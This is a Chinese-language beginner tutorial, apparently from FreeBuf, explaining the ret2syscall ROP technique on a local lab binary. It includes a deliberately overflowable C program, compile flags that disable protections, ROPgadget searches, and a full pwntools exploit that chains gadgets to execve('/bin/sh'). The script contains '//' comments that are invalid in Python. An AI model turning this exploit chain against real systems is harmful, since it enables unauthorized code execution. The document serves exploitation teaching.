**对于初学pwn的同学来说，在学习ret2syscall的时候，看到其原理为“控制程序执行系统调用,获取
shell”，那么怎么理解“控制程序执行系统调用,获取 shell”这句话呢？**  

## 0x01 背景知识

1、rop：在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。

2、gadgets：在程序中的指令片段，有时我们为了达到我们执行命令的目的，需要多个gadget来完成我们的功能。gadget最后一般都有ret，因为我们需要将程序控制权(EIP)给下一个gadget。即让程序自动持续的选择堆栈中的指令依次执行。

3、ropgadgets：一个pwntools的一个命令行工具，用来具体寻找gadgets的。例如：我们从pop、ret序列当中寻找其中的eax

    
    
    ROPgadget --binary ./7.exe --only "pop|ret" | grep "eax"  
    

4、在linux系统中，函数的调用是有一个系统调用号的。我们实验要调用的execve("/bin/sh",null,null)函数其系统调用号是11，即十六进制0xb。  

## 0x02 原理详解

这里需要重点理解“系统调用”，从<https://blog.csdn.net/qq_33948522/article/details/93880812>了解到系统调用的原理。

![1.png](https://image.3001.net/images/20200421/1587459377_5e9eb531dd62e.png!small)对于初学pwn的同学来说，怎么理解上面的知识呢？我们不妨拿execve("/bin/sh",null,null)这个函数来理解上面内容。首先，其函数的调用过程为：

    
    
    系统调用号，即 eax 应该为 0xb
    第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
    第二个参数，即 ecx 应该为 0
    第三个参数，即 edx 应该为 0  
    

系统在运行的时候会使用上面四个寄存器，所以那么上面内容我们可以写为int 0x80(eax,ebx,ecx,edx)。只要我们把对应获取 shell
的系统调用的参数放到对应的寄存器中，那么我们再执行 int 0x80 就可执行对应的系统调用。

但是我们该怎么控制这些寄存器的值？

在我们最开始学习汇编函数的时候，我们最常用到的就是push，pop，ret指令，而这一次我们将使用pop和ret的组合来控制寄存器的值以及执行方向。例如：在一个栈上，假设栈顶的值为2，当我们pop
eax,时，2就会存进eax寄存器。同样的，我们可以用同样的方法完成execve()函数参数的控制

    
    
    pop eax# 系统调用号载入， execve为0xb
    pop ebx# 第一个参数， /bin/sh的string
    pop ecx# 第二个参数，0
    pop edx# 第三个参数，0  
    

这样寄存器的值可以控制了。然后使用gadgets让这一连串的pop命令顺序连接执行 ，最后使用的ret指令 ，进而控制程序执行流程。

## 0x03 实例分析

这是我们的实验程序7.c，里面func函数里的read函数会发生溢出。

    
    
    #include <stdio.h>
    #include <string.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <sys/syscall.h>
    void exploit()
    {
        system("/bin/sh");
    }
    void func()
    {
    char str[0x20];
    read(0,str,0x50);
    }
    int main()
    {
    func();
    return 0;
    }  
    

将其编译，不使用堆栈保护，且需要设置成静态编译即-static，否则将找不到这个程序的指令流。  

    
    
    gcc -no-pie -fno-stack-protector  -static -m32  -o 7.exe 7.c

找出其溢出位置：

![2.png](https://image.3001.net/images/20200421/1587460613_5e9eba050b803.png!small)

![3.png](https://image.3001.net/images/20200421/1587460622_5e9eba0e5fae6.png!small)![4.png](https://image.3001.net/images/20200421/1587460630_5e9eba164e906.png!small)![5.png](https://image.3001.net/images/20200421/1587460638_5e9eba1ea35c7.png!small)
通过ROPgadget这个工具来获取7.exe中这些指令的位置。  

从pop、ret序列当中寻找其中的eax

    
    
    ROPgadget --binary ./7.exe --only "pop|ret" | grep "eax"

![6.png](https://image.3001.net/images/20200421/1587460764_5e9eba9c2c12c.png!small)

从pop、ret序列当中寻找其中的ebx、ecx、dex

    
    
    ROPgadget --binary ./7.exe --only "pop|ret" | grep "ebx" | grep "ecx" | grep "edx" 

![7.png](https://image.3001.net/images/20200421/1587460785_5e9ebab1173fa.png!small)

找"/bin/sh"这个字符串的地址

    
    
    ROPgadget --binary ./7.exe --string "/bin/sh"

![8.png](https://image.3001.net/images/20200421/1587460804_5e9ebac4abe81.png!small)

int中断找"0x80"  

    
    
    ROPgadget --binary ./7.exe --only "int"|grep "0x80"

![9.png](https://image.3001.net/images/20200421/1587460822_5e9ebad60626a.png!small)

写出exp

    
    
    from pwn import *
    
    context(arch="i386",os="linux")
    
    p=process('./7.exe')
    
    offset = 44//溢出位置
    
    add_eax=p32(0x080aaa06)// pop eax ; ret 的地址
    
    value_eax=p32(0xb) //eax的值是0xb
    
    add_edx_ecx_ebx=p32(0x0806f711)//pop edx;pop ecx; pop ebx ；ret 的地址
    
    value_ebx=p32(0x080ae008)//ebx指向/bin/sh的地址
    
    value_ecx=p32(0)//ecx的值为0
    
    value_edx=p32(0)//edx的值为0
    
    add_int=p32(0x0804a3d2)
    
    payload =offset*'\x90'+add_eax+value_eax+add_edx_ecx_ebx+value_edx+value_ecx+value_ebx+add_int
    
    p.sendline(payload)
    
    p.interactive()  
    

成功getsehll

![10.png](https://image.3001.net/images/20200421/1587461242_5e9ebc7a370d4.png!small)

## 0x04 总结  

明白ret2syscall的原理重要的一步是明白在linux系统下是怎么进行系统调用的，理解系统调用的过程之后，构造payload也显得更为简单。

 ***本文作者：菜鸡CaiH，转载请注明来自FreeBuf.COM**

